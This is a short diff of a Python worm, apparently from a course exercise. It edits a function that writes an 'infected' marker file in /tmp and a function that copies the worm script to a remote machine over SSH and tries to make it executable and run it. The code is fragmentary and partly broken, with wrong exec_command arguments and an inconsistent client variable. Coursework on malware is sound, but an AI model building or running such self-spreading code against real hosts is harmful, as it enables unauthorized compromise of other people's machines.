@@ -46,7 +46,7 @@ def markInfected():
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
-	infect = open(" /tmp/infected.txt","w")
+	infect = open("/tmp/infected.txt","w")
 	infect.write("system has been infect")
 	infect.close()
 
@@ -67,8 +67,8 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	sshClient.put("worm.py","/tmp/"+"replicator_worm.py")
-	ssh.exec_command("chmod a+x", "/tmp/replicator_worm.py")
+	sshClient.put("replicator_worm.py","/tmp/"+"replicator_worm.py")
+	ssh.exec_command("chmod a+x", "python /tmp/replicator_worm.py")
 	pass
 
 
